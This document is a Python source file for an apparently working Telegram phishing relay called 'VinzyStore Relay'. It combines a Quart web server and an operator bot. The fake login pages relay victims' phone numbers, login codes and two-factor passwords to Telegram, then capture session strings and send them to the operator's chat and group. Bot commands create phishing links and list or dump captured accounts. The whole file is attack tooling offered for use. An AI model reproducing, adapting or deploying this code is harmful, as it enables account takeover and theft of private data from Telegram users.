import os
import asyncio
import telebot
from quart import Quart, request, render_template, jsonify
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from threading import Thread

# --- CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
BASE_URL = os.environ.get("BASE_URL", "Set your BASE_URL in Koyeb settings")

try:
    GROUP_ID = int(os.environ.get("GROUP_ID", 0))
except:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# Memory Storage
active_relays = {} # {phone: {client, hash, session_string}}
captured_list = [] # List of phone numbers captured this session

# --- TELEGRAM BOT COMMANDS ---

@bot.message_handler(commands=['start', 'help'])
@bot.message_handler(func=lambda m: m.text == '.help')
def send_help(m):
    if m.chat.id != GROUP_ID and m.chat.id != m.from_user.id:
        return

    help_text = (
        "👑 <b>VinzyStore Relay - Expert Guide</b>\n\n"
        "<b>Commands:</b>\n"
        "• <code>.help</code> - Show this detailed menu\n"
        "• <code>.link [id]</code> - Create a unique phishing link\n"
        "• <code>.list</code> - List all phone numbers captured since restart\n"
        "• <code>.profile [phone]</code> - Full data dump of a target\n"
        "• <code>.get [phone]</code> - Check if target is live in memory\n"
        "• <code>.info</code> - Server health & stats\n\n"
        "<b>Benefits:</b>\n"
        "✅ <b>Bypasses 2FA:</b> Captures cloud passwords.\n"
        "✅ <b>Permanent Access:</b> Generates String Sessions.\n"
        "✅ <b>Real-time:</b> Mirrors the official Telegram login."
    )
    bot.reply_to(m, help_text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def list_captured(m):
    if not captured_list:
        return bot.reply_to(m, "📝 <b>Database Empty.</b> No accounts captured yet.")
    
    count = len(captured_list)
    numbers = "\n".join([f"• <code>{num}</code>" for num in captured_list])
    bot.reply_to(m, f"📋 <b>Captured Accounts ({count}):</b>\n{numbers}", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text and m.text.startswith('.profile'))
def show_profile(m):
    parts = m.text.split(' ')
    if len(parts) < 2:
        return bot.reply_to(m, "❌ Usage: <code>.profile +855XXXX</code>")
    
    phone = parts[1]
    if phone in active_relays and "session" in active_relays[phone]:
        data = active_relays[phone]
        # In a real scenario, you'd use the client to fetch 'me' details.
        # For now, we display the stored captured info.
        profile_msg = (
            f"👤 <b>TARGET FULL PROFILE</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
            f"🔑 <b>Session String:</b>\n<code>{data['session']}</code>\n"
            f"🍪 <b>Status:</b> Authorized\n"
            f"🛡️ <b>2FA:</b> Captured/Bypassed\n"
            f"━━━━━━━━━━━━━━━\n"
            f"<i>Use the String Session above to dump photos/contacts.</i>"
        )
        bot.reply_to(m, profile_msg, parse_mode="HTML")
    else:
        bot.reply_to(m, "❌ <b>Profile Not Found.</b> Target must finish login first.")

@bot.message_handler(func=lambda m: m.text == '.info')
def server_info(m):
    active_count = len(active_relays)
    total_captured = len(captured_list)
    bot.reply_to(m, f"ℹ️ <b>Status:</b> ONLINE\n🔥 <b>In-Memory:</b> {active_count}\n💰 <b>Total Captured:</b> {total_captured}\n🔗 <b>Base:</b> {BASE_URL}", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text and m.text.startswith('.link'))
def gen_link(m):
    parts = m.text.split(' ')
    target_id = parts[1] if len(parts) > 1 else m.from_user.id
    generated_link = f"{BASE_URL.rstrip('/')}/?id={target_id}"
    bot.reply_to(m, f"🔗 <b>Your Link:</b>\n<code>{generated_link}</code>", parse_mode="HTML")

# --- WEB ROUTES ---

@app.route('/')
async def index():
    tid = request.args.get('id', 'Admin')
    return await render_template('login.html', tid=tid)

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone, tid = data.get('phone'), data.get('tid')
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}
        bot.send_message(tid, f"🎯 <b>Target Hit!</b>\n📱 Phone: <code>{phone}</code>", parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone, code, tid = data.get('phone'), data.get('code'), data.get('tid')
    if phone not in active_relays: return jsonify({"status": "error"})
    
    relay = active_relays[phone]
    try:
        await relay["client"].sign_in(phone, code, phone_code_hash=relay["hash"])
        session = relay["client"].session.save()
        active_relays[phone]["session"] = session
        if phone not in captured_list: captured_list.append(phone)
        
        log = f"💰 <b>CAPTURED!</b>\n📱 <code>{phone}</code>\n🔑 <code>{session}</code>"
        bot.send_message(tid, log, parse_mode="HTML")
        if GROUP_ID: bot.send_message(GROUP_ID, log, parse_mode="HTML")
        return jsonify({"status": "success"})
    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone, password, tid = data.get('phone'), data.get('password'), data.get('tid')
    if phone not in active_relays: return jsonify({"status": "error"})
    
    try:
        await active_relays[phone]["client"].sign_in(password=password)
        session = active_relays[phone]["client"].session.save()
        active_relays[phone]["session"] = session
        if phone not in captured_list: captured_list.append(phone)

        log = f"🔓 <b>2FA BYPASSED!</b>\n📱 <code>{phone}</code>\n🔑 <code>{session}</code>"
        bot.send_message(tid, log, parse_mode="HTML")
        if GROUP_ID: bot.send_message(GROUP_ID, log, parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# --- STARTUP ---
def run_bot():
    bot.remove_webhook()
    bot.polling(none_stop=True)

if __name__ == "__main__":
    Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=8000)
